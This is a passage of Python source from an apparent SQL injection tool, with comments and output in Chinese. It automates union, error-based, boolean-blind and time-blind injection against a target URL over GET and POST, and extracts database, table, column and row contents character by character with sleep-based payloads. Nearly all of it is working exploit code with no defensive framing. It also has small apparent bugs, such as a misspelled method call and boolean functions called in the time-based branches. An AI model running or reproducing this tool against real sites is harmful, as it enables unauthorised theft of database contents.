                    print("第", i + 1, "个字段的长度：", j)
                    p = "第" + str(i + 1) + "个字段的长度：" + str(j)
                    self.prints(p)
                    self.postTimeColumn(j, i, table_name)

    def getTimeData(self, dataLen, n, table_name, column_name):
        name = ''
        for j in range(1, dataLen + 1):
            for i in '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_':
                payloadDb = f"or if(substr((select {column_name} from {table_name} limit {n},1),{j},1)='{i}',sleep(3),1){self.exegesis}"
                url1 = self.url + payloadDb + self.column
                time1 = datetime.datetime.now()
                r1 = requests.get(url1)
                time2 = datetime.datetime.now()
                sec = (time2 - time1).seconds
                # print(url1)
                if sec >= 3:
                    name = name + i
                    # print(name)
                    break
        self.prints(name)
        print('data_name:', name)
        self.set_result('getTimeData', name)

    def postTimeData(self, dataLen, n, table_name, column_name):
        name = ''
        for j in range(1, dataLen + 1):
            for i in '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_':
                postDb = {
                    f"{self.id}": f"{self.value}{self.close} or if(substr((select {column_name} from {table_name} limit {n},1),{j},1)='{i}',sleep(3),1){self.exegesis}"}
                postDb.update(self.column)
                time1 = datetime.datetime.now()
                r1 = requests.post(self.url, headers=self.header, data=postDb)  # %23 <==> --+
                time2 = datetime.datetime.now()
                sec = (time2 - time1).seconds
                # print(url1)
                if sec >= 3:
                    name = name + i
                    # print(name)
                    break
        self.prints(name)
        print('data_name:', name)
        self.set_result('postTimeData', name)

    def getTimeDataData(self, dataCount, table_name, column_name):
        for i in range(0, dataCount):
            for j in range(1, 30):
                payloadTD = f'''or if(length((select {column_name} from {table_name} limit {i},1))={j},sleep(3),1){self.exegesis}'''
                url = self.url + payloadTD + self.column
                time1 = datetime.datetime.now()
                r = requests.get(url)  # %23 <==> --+
                time2 = datetime.datetime.now()
                sec = (time2 - time1).seconds
                # print(url)
                if sec >= 3:
                    print("第", i + 1, "个字段值的长度：", j)
                    p = "第" + str(i + 1) + "个字段的长度：" + str(j)
                    self.prints(p)
                    self.getTimeData(j, i, table_name, column_name)

    def postTimeDataData(self, dataCount, table_name, column_name):
        for i in range(0, dataCount):
            for j in range(1, 30):
                postTD = {
                    f"{self.id}": f"{self.value}{self.close} or if(length((select {column_name} from {table_name} limit {i},1))={j},sleep(3),1){self.exegesis}", }
                postTD.update(self.column)
                time1 = datetime.datetime.now()
                r1 = requests.post(self.url, headers=self.header, data=postTD)  # %23 <==> --+
                time2 = datetime.datetime.now()
                sec = (time2 - time1).seconds
                # print(url)
                if sec >= 3:
                    print("第", i + 1, "个字段值的长度：", j)
                    p = "第" + str(i + 1) + "个字段的长度：" + str(j)
                    self.prints(p)
                    self.postTimeData(j, i, table_name, column_name)

    def runGet(self, check, union):
        if 'union' in check:
            if union is not None:
                self.prints('联合注入结果：')
                self.getUnionDatabase(union[0], union[1])
                self.getUnionTable()
                # self.getUnionColumn(0)
                # self.getUnionData("username,password")
            else:
                print('error!')
        if 'error' in check:
            self.prints('报错注入结果：')
            self.getErrorDatabase()
            self.getErrorTable()
        if 'bool' in check:
            self.prints('布尔盲注结果：')
            self.prints('【databaselen】')
            databaselen1 = self.getBoolDataLenAndCount("databaseLen")
            self.prints('【databases】')
            self.getBoolDatabase(databaselen1)
            self.prints('【tablecount】')
            tableCount1 = self.getBoolDataLenAndCount("tableCount")
            self.prints('【tables】')
            self.getBoolTableData(tableCount1)
        if 'time' in check:
            self.prints('时间盲注结果：')
            self.prints('【databaselen】')
            databaselen2 = self.gettTimeDataLenAndCount("databaseLen")
            self.prints('【databases】')
            self.getTimeDatabase(databaselen2)
            self.prints('【tablecount】')
            tableCount2 = self.getTimeDataLenAndCount("tableCount")
            self.prints('【tables】')
            self.getTimeTableData(tableCount2)




    def runPost(self, check, union):
        if 'union' in check:
            if union is not None:
                self.prints('联合注入结果：')
                self.postUnionDatabase(union[0], union[1])
                self.postUnionTable()
            else:
                print('error!')
        if 'error' in check:
            self.prints('报错注入结果：')
            self.postErrorDatabase()
            self.postErrorTable()
        if 'bool' in check:
            self.prints('布尔盲注结果：')
            self.prints('【databaselen】')
            databaselen1 = self.postBoolDataLenAndCount("databaseLen")
            self.prints('【databases】')
            self.postBoolDatabase(databaselen1)
            self.prints('【tablecount】')
            tableCount1 = self.postBoolDataLenAndCount("tableCount")
            self.prints('【tables】')
            self.postBoolTableData(tableCount1)
        if 'time' in check:
            self.prints('时间盲注结果：')
            self.prints('【databaselen】')
            databaselen2 = self.postTimeDataLenAndCount("databaseLen")
            self.prints('【databases】')
            self.postTimeDatabase(databaselen2)
            self.prints('【tablecount】')
            tableCount2 = self.postTimeDataLenAndCount("tableCount")
            self.prints('【tables】')
            self.postTimeTableData(tableCount2)


    def run(self, check, union=None):
        print('union', union)
        glo.answer = 'start\n\n'
        if self.method == 'get':
            self.runGet(check, union)
        else:
            self.runPost(check, union)

    def run_columnName(self, check, table_name, union=None):
        if self.method == 'get':
            if 'union' in check:
                if union is not None:
                    self.prints('联合注入结果：')
                    self.getUnionColumn(table_name)
            if 'error' in check:
                self.prints('报错注入结果：')
                self.getErrorColumn(table_name)
            if 'bool' in check:
                self.prints('布尔盲注结果：')
                columnCount = f'(select count(column_name) from information_schema.columns where table_schema=database() and table_name = "{table_name}")'
                self.datalen['columnCount'] = columnCount
                self.prints('【columncount】')
                columnCount1 = self.getBoolDataLenAndCount('columnCount')
                self.prints('【columns】')
                self.getBoolColumnData(columnCount1, table_name)
            if 'time' in check:
                self.prints('时间盲注结果：')
                columnCount = f'(select count(column_name) from information_schema.columns where table_schema=database() and table_name = "{table_name}")'
                self.timedatalen['columnCount'] = columnCount
                self.prints('【columncount】')
                columnCount2 = self.getTimeDataLenAndCount('columnCount')
                self.prints('【columns】')
                self.getTimeColumnData(columnCount2, table_name)
        else:
            if 'union' in check:
                if union is not None:
                    self.prints('联合注入结果：')
                    self.postUnionColumn(table_name)
            if 'error' in check:
                self.prints('报错注入结果：')
                self.postErrorColumn(table_name)
            if 'bool' in check:
                self.prints('布尔盲注结果：')
                columnCount = f'(select count(column_name) from information_schema.columns where table_schema=database() and table_name = "{table_name}")'
                self.datalen['columnCount'] = columnCount
                self.prints('【columncount】')
                columnCount1 = self.postBoolDataLenAndCount('columnCount')
                self.prints('【columns】')
                self.postBoolColumnData(columnCount1, table_name)
            if 'time' in check:
                self.prints('时间盲注结果：')
                columnCount = f'(select count(column_name) from information_schema.columns where table_schema=database() and table_name = "{table_name}")'
                self.timedatalen['columnCount'] = columnCount
                self.prints('【columncount】')
                columnCount2 = self.postBoolDataLenAndCount('columnCount')
                self.prints('【columns】')
                self.postTimeColumnData(columnCount2, table_name)


    def run_columnData(self, check, table_name, column_name, union=None):
        if self.method == 'get':
            if 'union' in check:
                if union is not None:
                    self.prints('联合注入结果：')
                    self.getUnionData(table_name, column_name)
            if 'error' in check:
                self.prints('报错注入结果：')
                self.getErrorData(table_name, column_name)
            if 'bool' in check:
                self.prints('布尔盲注结果：')
                dataCount = f'(select count({column_name}) from {table_name})'
                self.datalen['dataCount'] = dataCount
                self.prints('【datacount】')
                datacount = self.getBoolDataLenAndCount('dataCount')
                self.prints('【datas】')
                self.getBoolDataData(datacount, table_name, column_name)
            if 'time' in check:
                self.prints('时间盲注结果：')
                dataCount = f'(select count({column_name}) from {table_name})'
                self.timedatalen['dataCount'] = dataCount
                self.prints('【datacount】')
                datacount = self.getTimeDataLenAndCount('dataCount')
                self.prints('【datas】')
                self.getTimeDataData(datacount, table_name, column_name)
        else:
            if 'union' in check:
                if union is not None:
                    self.prints('联合注入结果：')
                    self.postUnionData(table_name, column_name)
            if 'error' in check:
                self.prints('报错注入结果：')
                self.postErrorData(table_name, column_name)
            if 'bool' in check:
                self.prints('布尔盲注结果：')
                dataCount = f'(select count({column_name}) from {table_name})'
                self.datalen['dataCount'] = dataCount
                self.prints('【datacount】')
                datacount = self.postBoolDataLenAndCount('dataCount')
                self.prints('【datas】')
                self.postBoolDataData(datacount, table_name, column_name)
            if 'time' in check:
                self.prints('时间盲注结果：')
                dataCount = f'(select count({column_name}) from {table_name})'
                self.timedatalen['dataCount'] = dataCount
                self.prints('【datacount】')
                datacount = self.postBoolDataLenAndCount('dataCount')
                self.prints('【datas】')
                self.postTimeDataData(datacount, table_name, column_name)
